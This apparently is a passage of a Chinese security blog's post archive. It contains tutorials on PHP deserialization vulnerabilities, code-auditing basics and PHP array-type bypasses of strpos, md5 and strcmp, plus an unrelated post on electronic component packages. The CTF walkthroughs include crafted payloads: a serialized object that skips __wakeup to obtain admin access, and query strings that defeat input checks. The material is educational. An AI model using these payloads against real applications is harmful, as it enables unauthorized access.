<span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>

<span class="token variable">$test2</span> <span class="token operator">=</span> <span class="token variable">$test1_ser</span><span class="token punctuation">;</span>
<span class="token variable">$test2_unser</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$test2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$test2_unser</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token delimiter">?></span></code></pre>
<p>结果：</p>
<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Test"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"flag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"123"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
Test <span class="token function">Object</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">123</span>
<span class="token punctuation">)</span></code></pre>
<blockquote>
<p>当使用unserialize()函数时，将会调用__wakeup()成员函数</p>
</blockquote>
<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a><font color="green">反序列化漏洞</font></h2><p>因为传入unserialize()函数的参数可控，我们可以通过传入恶意构造的字符串，从而控制对象内部的函数或者变量。</p>
<h3 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h3><p>在利用对PHP反序列化进行利用时，经常需要通过反序列化中的魔术方法，检查方法里有无敏感操作来进行利用。</p>
<p>常见的方法：</p>
<ul>
<li>__construct()：创建对象时自动调用</li>
<li>__destruct()：对象被销毁时自动调用</li>
<li>__wakeup()：unserialize()时自动调用</li>
<li>__call()：在对象上下文中调用不可访问的方法时触发</li>
<li>__sleep()：对象被序列化之前触发</li>
<li>__toString()：把类当作字符串使用时触发,返回值需要为字符串</li>
</ul>
<p>我们举个例子看看魔法函数在序列化和反序列化过程中如何调用的：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"__construct"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"__sleep"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"__destruct"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$test1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span>
<span class="token variable">$test1_ser</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$test1_unser</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$test1_ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$test1_unser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token delimiter">?></span></code></pre>
<p>结果如下：</p>
<pre><code>__construct
__sleep
__destruct</code></pre><h3 id="属性权限"><a href="#属性权限" class="headerlink" title="属性权限"></a>属性权限</h3><p>类中的属性有三个权限：</p>
<ul>
<li><code>Public</code>权限</li>
<li><code>Private</code>权限</li>
<li><code>Protected</code>权限</li>
</ul>
<p>这三种权限的属性经过序列化后的字符长度不一样，字符的变化不同</p>
<ol>
<li><p>public权限</p>
<p><img src="https://s1.ax1x.com/2020/05/12/Ytt7d0.png" alt="image" style="zoom:80%;"><img src="https://s1.ax1x.com/2020/05/12/YttHoV.png" alt="iamge"></p>
<p>可以看到字符串长度没变，字符前后也没有变化</p>
</li>
<li><p>private权限</p>
<img src="https://s1.ax1x.com/2020/05/12/YttqiT.png" alt="image" style="zoom:80%;">

<p>发现字符串长度变成了10，而且字符串也变成<code>%00类名%00属性名</code>的形式</p>
</li>
<li><p>protected权限</p>
<p><img src="https://s1.ax1x.com/2020/05/12/YttHoV.png" alt="iamge"></p>
<p>发现字符串长度变成了7，而且字符串变成<code>%00*%00属性名</code>的形式</p>
</li>
</ol>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a><font color="green">例子</font></h2><h3 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
<span class="token variable">$KEY</span> <span class="token operator">=</span> <span class="token string">"D0g3!!!"</span><span class="token punctuation">;</span>
<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"$KEY"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"$flag"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>我们构造payload：</p>
<p><code>http://120.79.33.253:9001/?str=s:7:%22D0g3!!!%22</code> 即可得到flag</p>
<h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>打开网站后提示备份，用dirsearch扫出来一个<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
<p>下载后打开index.php发现一段代码：</p>
<pre class=" language-php"><code class="language-php">    <span class="token delimiter">&lt;?php</span>
    <span class="token keyword">include</span> <span class="token string">'class.php'</span><span class="token punctuation">;</span>
    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token delimiter">?></span></code></pre>
<p>再看class.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span>


<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">'nonono'</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">'yesyes'</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string">"You name is: "</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string">"You password is: "</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>所以我们要让password=100，且username=admin，并用序列化传进去即可得到flag</p>
<p>构造一下：</p>
<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Name"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"Nameusername"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"Namepassword"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<p>但我们还需要绕过__wakeup() 和 __destruct()</p>
<p>在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行</p>
<p>所以构造出：</p>
<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"Nameusername"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"Namepassword"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<p>不过变量是private型，该类私有字段的字段名在序列化时，类名和字段名前面都会加上\0</p>
<p>最后构造：</p>
<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"%00Name%00username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"%00Name%00password"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<p>payload:</p>
<p><code>select={s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}</code></p>
]]></content>
      <categories>
        <category>反序列化</category>
        <category>CTF</category>
        <category>代码审计</category>
        <category>漏洞挖掘</category>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
        <tag>CTF</tag>
        <tag>反序列化</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计学习（一）</title>
    <url>/2019/11/02/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80)/</url>
    <content><![CDATA[<h2 id="代码审计学习（一）"><a href="#代码审计学习（一）" class="headerlink" title="代码审计学习（一）"></a>代码审计学习（一）</h2><h3 id="PHP核心配置"><a href="#PHP核心配置" class="headerlink" title="PHP核心配置"></a>PHP核心配置</h3><p><font color="green"><strong>首先需了解 PHP_INI_* 常量的定义</strong></font></p>
<a id="more"></a>

<table>
<thead>
<tr>
<th>常量</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>PHP_INI_USER</td>
<td>可在用户的php脚本或者windows注册表中设置</td>
</tr>
<tr>
<td>PHP_INI_PERDIR</td>
<td>可在php.ini .htaccess或http.conf中设置</td>
</tr>
<tr>
<td>PHP_INI_SYSTEM</td>
<td>可在php.ini 或 http.conf中配置</td>
</tr>
<tr>
<td>PHP_INI_ALL</td>
<td>可在任何地方配置</td>
</tr>
<tr>
<td>PHP.ini only</td>
<td>可仅在php.ini中配置</td>
</tr>
</tbody></table>
<hr>
<ul>
<li><strong>常见影响安全的配置</strong></li>
</ul>
<p><font color="green"><strong>1. register_globals(全局注册变量)：</strong></font><br>    <strong>若为on</strong>，会直接把用户通过GET、POST传进来的参数<strong>注册为全局变量并初始化参数对应的值</strong></p>
<pre><code> 仅在php版本低于5.4.0时可用 </code></pre><p><font color="green"><strong>2. allow_url_include(是否运行包含远程文件)：</strong></font><br>    <strong>若为on，可以直接包含远程文件</strong>。当变量可控时，可用来构造php代码。   </p>
<pre><code>allow_url_include在 PHP 5.2.0后默认为off，配置范围是PHP_INI_ALL</code></pre><p><font color="green"><strong>3. magic_quotes_gpc(魔术引号自动过滤)：</strong></font><br>    <strong>若为on</strong>，会自动在GET、POST、COOKIE到的变量中的<strong>单引号（’)、双引号(“)、反斜杠(\)及空白字符（NULL)前加上反斜杠(\)</strong>。但是在PHP5中的magic_quotes_gpc并<strong>不会过滤</strong><font color="red">$_SERVER变量</font>，导致很多漏洞</p>
<pre><code>在PHP5.4之前可用。小于4.2.3时配置范围是PHP_INI_ALL;大于时是PHP_INI_PERDIR</code></pre><p><font color="green"><strong>4. magic_quotes_runtime(魔术引号自动过滤)：</strong></font><br>    与magic_quotes_gpc概念差不多，但处理对象不同。<strong>只处理从数据库或者文件中获取的数据</strong>。</p>
<pre><code>只有部分函数受影响，大多为读取数据库或文件的函数</code></pre><p><font color="green"><strong>5. magic_quotes_sybase(魔术引号自动过滤)：</strong></font><br>    用于自动过滤字符。<strong>当为on，会覆盖掉magic_quotes_gpc=on的配置</strong>。处理对象与gpc一致，但处理方式仅仅为转义空字符与把 ‘ 变成 “</p>
<pre><code>PHP 5.4.0前可用，配置范围为PHP_INI_ALL</code></pre><p><font color="green"><strong>6. safe_mode(安全模式)：</strong></font><br>    PHP内嵌的安全机制。当为on时，可用的指令为 <strong>safe_mode_include_dir</strong>、<strong>safe_mode_exec_dir</strong>、<strong>safe_mode_allow_env_vars</strong>、<strong>safe_mode_protected_env_vars</strong></p>
<pre><code>safe_mode指令的配置范围为PHP_INI_SYSTEM PHP5.4之后被取消

所有文件操作函数会受限制（file()、include()..)

通过函数popen()、system()、exec()执行命令或程序会报错</code></pre><p><font color="green"><strong>7. open_basedir：</strong></font><br>    open_basedir指令用来<strong>限制PHP只能访问哪些目录</strong></p>
<pre><code>指定的限制是前缀不是文件名

小于 PHP5.2.3时是PHP_INI_SYSTEM，大于时是PHP_INI_ALL</code></pre><p><font color="green"><strong>8. disable_functions(禁用函数)：</strong></font><br>    <strong>禁止敏感函数的使用</strong></p>
<pre><code>记得把dl()禁掉 否则可利用dl()绕过

配置范围为php.ini only</code></pre><hr>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul>
<li>编辑器：<strong>sublime text</strong>、UltraEdit</li>
<li>审计工具：<strong>Seay源码审计系统</strong>、RIPS</li>
<li>漏洞验证工具：<strong>burp</strong>、Firebug、</li>
<li>辅助工具：编码转换工具、正则调试工具等</li>
</ul>
<hr>
<h3 id="代码审计思路"><a href="#代码审计思路" class="headerlink" title="代码审计思路"></a>代码审计思路</h3><p><font color="red"><strong>1. 根据敏感关键字回溯参数传递过程</strong></font></p>
<p><font color="green"><strong>2. 查看可控变量，正向追踪变量传递过程</strong></font></p>
<p><font color="lightblue"><strong>3. 寻找敏感功能点，通读功能点代码</strong></font></p>
<p><strong>4. 直接通读全文代码</strong></p>
<hr>
]]></content>
      <categories>
        <category>WEB安全</category>
        <category>CTF</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>WEB安全</tag>
        <tag>漏洞挖掘</tag>
        <tag>CTF</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP数组绕过</title>
    <url>/2019/10/27/PHP%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="PHP数组绕过"><a href="#PHP数组绕过" class="headerlink" title="PHP数组绕过"></a>PHP数组绕过</h2><h3 id="绕过strops-函数"><a href="#绕过strops-函数" class="headerlink" title="绕过strops()函数"></a>绕过strops()函数</h3><p><font color="green"><strong>1. strops()定义：</strong></font></p>
<p>strpos() 函数查找字符串在另一字符串中<strong>第一次</strong>出现的<strong>位置</strong>。</p>
<a id="more"></a>

<blockquote>
<p>strpos() 函数对大小写敏感。</p>
</blockquote>
<p><font color="green"><strong>2. strops()语法：</strong></font></p>
<pre><code>strpos(string,find,start)</code></pre><table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>string</td>
<td>必需。规定要搜索的字符串。</td>
</tr>
<tr>
<td>find</td>
<td>必需。规定要查找的字符串。</td>
</tr>
<tr>
<td>start</td>
<td>可选。规定从何处开始搜索。</td>
</tr>
</tbody></table>
<ul>
<li><strong>返回值：    返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。</strong></li>
</ul>
<blockquote>
<p>字符串位置从 0 开始，不是从 1 开始。</p>
</blockquote>
<hr>
<h4 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><ul>
<li>它<strong>不能对数组处理</strong>，如果是数组则返回null,null，也就不等于FALSE。</li>
</ul>
<p>下面用南邮的一道ctf题举例：</p>
<pre><code>&lt;?php

$flag = &quot;flag&quot;;

    if (isset ($_GET[&#39;nctf&#39;])) {
        if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;nctf&#39;]) === FALSE)
            echo &#39;必须输入数字才行&#39;;
        else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !== FALSE)   
            die(&#39;Flag: &#39;.$flag);
        else
            echo &#39;骚年，继续努力吧啊~&#39;;
    }

 ?&gt;</code></pre><p>这里首先看到的是get传参nctf，然后必须是数字，最后需要绕过strpos()函数</p>
<pre><code>payload: ?ctf[]=1</code></pre><p><a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=1" target="_blank" rel="noopener">即可得到flag</a></p>
<hr>
<h3 id="绕过md5-函数判断"><a href="#绕过md5-函数判断" class="headerlink" title="绕过md5()函数判断"></a>绕过md5()函数判断</h3><p><font color="green"><strong>1. md5()定义：</strong></font></p>
<ul>
<li>md5() 函数计算字符串的 MD5 散列。</li>
</ul>
<p><font color="green"><strong>2. md5()语法：</strong></font></p>
<pre><code>md5(string,raw)</code></pre><table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>string</td>
<td>必需。规定要计算的字符串。</td>
</tr>
<tr>
<td>raw</td>
<td>可选。规定十六进制或二进制输出格式</td>
</tr>
</tbody></table>
<ul>
<li>返回值：    <strong>如果成功则返回已计算的 MD5 散列，如果失败则返回 FALSE</strong>。</li>
</ul>
<hr>
<p>二话不说直接看例子</p>
<pre><code>if (isset($_GET[&#39;a&#39;]) and isset($_GET[&#39;b&#39;])) {
if ($_GET[&#39;a&#39;] != $_GET[&#39;b&#39;])
if (md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;]))
die(&#39;Flag: &#39;.$flag);
else
print &#39;Wrong.&#39;;
}</code></pre><p><font color="red">要得到flag我们需满足三个if条件：</font></p>
<p><strong>1. 同时传入a和b</strong></p>
<p><strong>2. a和b的值不能等</strong></p>
<p><strong>3. a和b的md5值需相等</strong></p>
<h4 id="漏洞原因-1"><a href="#漏洞原因-1" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><ul>
<li>md5()函数无法处理数组，<strong>如果传入的为数组，会返回NULL</strong>，<font color="green">所以两个数组经过加密后得到的都是NULL,也就是相等的。</font></li>
</ul>
<p>所以构造poc:</p>
<pre><code>?a[]=0&amp;b[]=1</code></pre><p><a href="http://chinalover.sinaapp.com/web17/index.php?a[]=0&b[]=1" target="_blank" rel="noopener">即可得到flag</a></p>
<hr>
<h3 id="绕过strcmp-函数"><a href="#绕过strcmp-函数" class="headerlink" title="绕过strcmp()函数"></a>绕过strcmp()函数</h3><p><font color="green"><strong>1. strcmp()定义：</strong></font></p>
<ul>
<li>strcmp() 函数比较两个字符串。</li>
</ul>
<blockquote>
<p>strcmp() 函数是二进制安全的，且对大小写敏感。</p>
</blockquote>
<p><font color="green"><strong>2. strcmp()语法：</strong></font></p>
<pre><code>strcmp(string1,string2)</code></pre><table>
<thead>
<tr>
<th>string1</th>
<th>string2</th>
</tr>
</thead>
<tbody><tr>
<td>string1</td>
<td>必需。规定要比较的第一个字符串。</td>
</tr>
<tr>
<td>string2</td>
<td>必需。规定要比较的第二个字符串。</td>
</tr>
</tbody></table>
<ul>
<li>返回值：</li>
</ul>
<ol>
<li>如果两个字符串相等，返回0</li>
<li>如果string1 &lt; string2，返回 &lt;0 </li>
<li>如果string1 &lt; string2, 返回 &gt;0</li>
</ol>
<hr>
<h4 id="漏洞原因-2"><a href="#漏洞原因-2" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><ul>
<li><strong>5.2</strong>中 是将两个参数先<strong>转换成string类型</strong>。</li>
<li><strong>5.3.3</strong>以后，当<strong>比较数组和字符串</strong>的时候，返回是0。</li>
<li><strong>5.5</strong>中 如果参数<strong>不是string类型，直接return</strong></li>
</ul>
<p>所以会出现三种情形：</p>
<pre><code>strcmp(&quot;foo&quot;, array()) =&gt; NULL + PHP Warning

strcmp(&quot;foo&quot;, new stdClass) =&gt; NULL + PHP Warning

strcmp(function(){}, &quot;&quot;) =&gt; NULL + PHP Warning</code></pre><p>举例：</p>
<pre><code>$pass=@$_POST[&#39;pass&#39;];
$pass1=***********;//被隐藏起来的密码
if(isset($pass))
{
if(@!strcmp($pass,$pass1)){
echo &quot;flag:nctf{*}&quot;;
}else{
echo &quot;the pass is wrong!&quot;;
}
}else{
echo &quot;please input pass!&quot;;
}
?&gt;</code></pre><p>构造poc：</p>
<pre><code>pass[]=aa  //通过post提交</code></pre><p>即可绕过strcmp()函数</p>
<hr>
]]></content>
      <categories>
        <category>PHP</category>
        <category>CTF</category>
        <category>WEB安全</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>WEB安全</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>元器件封装学习</title>
    <url>/2019/10/26/%E5%85%83%E5%99%A8%E4%BB%B6%E5%B0%81%E8%A3%85%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="元器件封装大全"><a href="#元器件封装大全" class="headerlink" title="元器件封装大全"></a>元器件封装大全</h1><p>[Toc]</p>
<h2 id="元器件封装的类型"><a href="#元器件封装的类型" class="headerlink" title="元器件封装的类型"></a><strong>元器件封装的类型</strong></h2><h3 id="1-直插式元器件封装"><a href="#1-直插式元器件封装" class="headerlink" title="1.直插式元器件封装"></a>1.直插式元器件封装</h3><ul>
<li>直插式元器件封装的焊板一般贯穿整个电路板，从顶层穿下，在底层进行元器件的引脚焊接<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=669721767,1282905816&fm=26&gp=0.jpg" alt></li>
</ul>
<a id="more"></a>

<p><img src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=3969731901,1763990907&fm=26&gp=0.jpg" alt></p>
<hr>
<h3 id="2-表贴式元器件封装"><a href="#2-表贴式元器件封装" class="headerlink" title="2.表贴式元器件封装"></a>2.表贴式元器件封装</h3><ul>
<li>表贴式元器件指其焊板只附着在电路板的底层或顶层，元器件的焊接是在装配元器件的工作层面进行的</li>
</ul>
<p><img src="https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=1114591927,3342303898&fm=26&gp=0.jpg" alt><br><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=56149140,3725002996&fm=26&gp=0.jpg" alt></p>
<ul>
<li><font color="red">在PCB元器件库中，表贴式元器件的封装的引脚一般为红色，表示处在电路板的顶层（Top Layer）</font></li>
</ul>
<hr>
<h2 id="常用元器件的原理图符号和元器件封装"><a href="#常用元器件的原理图符号和元器件封装" class="headerlink" title="常用元器件的原理图符号和元器件封装"></a><strong>常用元器件的原理图符号和元器件封装</strong></h2><h3 id="1-电阻"><a href="#1-电阻" class="headerlink" title="1.电阻"></a>1.电阻</h3><ul>
<li>固定电阻</li>
</ul>
<blockquote>
<p>RT型碳膜电阻</p>
</blockquote>
<blockquote>
<p>RJ型金属膜电阻</p>
</blockquote>
<blockquote>
<p>RX型线绕电阻</p>
</blockquote>
<blockquote>
<p>片状电阻</p>
</blockquote>
<ul>
<li>固定电阻原理图常用符号名称：</li>
</ul>
<blockquote>
<p>1.RES1</p>
</blockquote>
<blockquote>
<p>2.RES2</p>
</blockquote>
<ul>
<li>常用的引脚封装形式：AXIAL-0.3、AXIAL-0.4、AXIAL-0.5、AXIAL-0.6、AXIAL-0.7、AXIAL-0.8、AXIAL-0.9、AXIAL-1.0等</li>
</ul>
<blockquote>
<p>后缀数字代表两个焊盘的间距，单位为英寸<br>后缀数字越大，元器件的外形尺寸就越大，说明该电阻的额定功率越大</p>
</blockquote>
<hr>
<ul>
<li>可变电阻</li>
</ul>
<blockquote>
<p>电位器属于可变电阻，是一种连续可调的电阻器，其电阻值在一定范围内是连续可调的</p>
</blockquote>
<blockquote>
<p>电位器的种类：1.线绕电阻 2.碳膜电位器</p>
</blockquote>
<hr>
<ul>
<li>特种电阻</li>
</ul>
<hr>
<ul>
<li>特殊电阻：热敏电阻、湿敏电阻、压控电阻等</li>
</ul>
<hr>
<ul>
<li><p><font color="blue">将多个电阻集成在一个封装内，从而形成电阻桥以及各种电阻排</font></p>
</li>
<li><p><font color="red">由于种类与型号繁多，选用时应靠实际需求选型</font></p>
</li>
</ul>
<hr>
<hr>
<h3 id="2-电容"><a href="#2-电容" class="headerlink" title="2.电容"></a>2.电容</h3><ul>
<li>种类：钽电容、瓷片电容、独石电容、 CBB 电容和电解电容等。</li>
<li>根据极性不同分为：无极性电容和有极性电容</li>
